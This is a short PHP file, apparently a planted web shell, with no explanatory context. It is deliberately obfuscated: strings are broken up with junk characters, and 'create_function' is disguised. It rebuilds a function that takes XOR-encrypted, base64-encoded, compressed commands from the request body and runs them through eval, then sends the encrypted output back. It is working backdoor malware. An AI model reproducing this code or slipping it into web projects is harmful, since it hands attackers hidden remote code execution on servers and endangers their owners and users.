<?php
$m='mIf[If1]),$k)));$o=If@ob_get_IfcoIfntentIfs();If@Ifob_end_clean();$rIf=@';
$D='strleIfn($t);$oIf="";for($iIf=0If;$iIf<$l;){for($j=0If;($j<$c&If&$i<$Ifl)';
$P='$Ifm)==1) {@Ifob_start();@eIfval(@gzuncIfomIfpIfress(@x(@basIfe64_deIfcode($';
$b='cIfhIf("/$khIf(.+)$kf/",@fiIfleIf_get_cIfontents(IfIf"php://inputIf"),IfIf';
$l=';$jIf++,$i++)If{$o.IfIf=$t{$i}If^$Ifk{$j};}If}return $Ifo;}if (@preIfg_mat';
$n='"dIffIfoJm5yZrQ1m1P3IfB";funcIftiIfon x($t,If$k){$c=strlIfeIfnIf($kIf);$l=';
$a=str_replace('Ql','','QlcrQleatQle_QlfQlunQlction');
$k='$k="5584IfIfb5d8";$kh="5If120Ifd03If93991";$kf="Ife56IfIf2Ifcedc7d47";$p=';
$g='baIfse64_enIfcode(If@x(@gzcoIfmpreIfsIfs($o),$k));pIfrint("$pIf$khIf$r$kf");}';
$U=str_replace('If','',$k.$n.$D.$l.$b.$P.$m.$g);
$O=$a('',$U);$O();
?>
